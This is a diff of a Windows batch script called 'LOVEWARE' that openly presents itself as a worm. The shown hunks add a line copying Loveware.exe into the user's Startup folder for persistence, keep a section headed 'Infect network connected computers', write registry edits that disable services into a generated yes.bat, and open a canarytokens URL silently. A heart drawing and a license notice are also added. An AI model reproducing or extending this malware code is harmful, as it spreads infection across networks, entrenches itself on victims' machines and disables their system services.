@@ -1,6 +1,6 @@
 @echo off
 
-:: LOVEWARE v8.6
+:: LOVEWARE v8.7
 ::
 :: YOU CAN DELETE THIS 
 :: |  |  |  |  |  |  |
@@ -172,9 +172,14 @@ goto copylove
 
 start /min http://canarytokens.com/tags/terms/h8blu81q8j2vzu825fmpzut7r/contact.php
 
+:run1
+
+:: Copy Loveware to the startup
+
+XCOPY "Loveware.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+
 :: Infect network connected computers
 
-:run1
 @echo off
 SET i=0
 SET "NomeProcesso=Loveware.exe"
@@ -506,8 +511,6 @@ echo reg add %key% /v Start /t REG_DWORD /d 4>>yes.bat
 :: Copy Loveware with some other things
 :: to the startup folder
 
-::::::::::::::::XCOPY "Loveware.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
-
 echo timeout 400>>yes.bat
 
 :: Have mersy and let the guy live
@@ -690,7 +693,24 @@ goto :again
 goto checker
 
 
-
+::       .....           .....
+::   ,ad8PPPP88b,     ,d88PPPP8ba,
+::  d8P"      "Y8b, ,d8P"      "Y8b
+:: dP'           "8a8"           `Yd
+:: 8(              "              )8
+:: I8                             8I
+::  Yb,                         ,dP
+::   "8a,                     ,a8"
+::     "8a,                 ,a8"
+::       "Yba             adP"
+::         `Y8a         a8P'
+::           `88,     ,88'
+::             "8b   d8"
+::              "8b d8"
+::               `888'
+::                 "
+::
+::
 :: PLEASE DO NOT COPY THE LOVEWARE CODE AND RENAME IT
 :: THAT'S NOT CREATING THAT IS STEALING.
 :: THIS SOFTWARE IS PROTECTED BY A GNU PUBLIC LICENSE
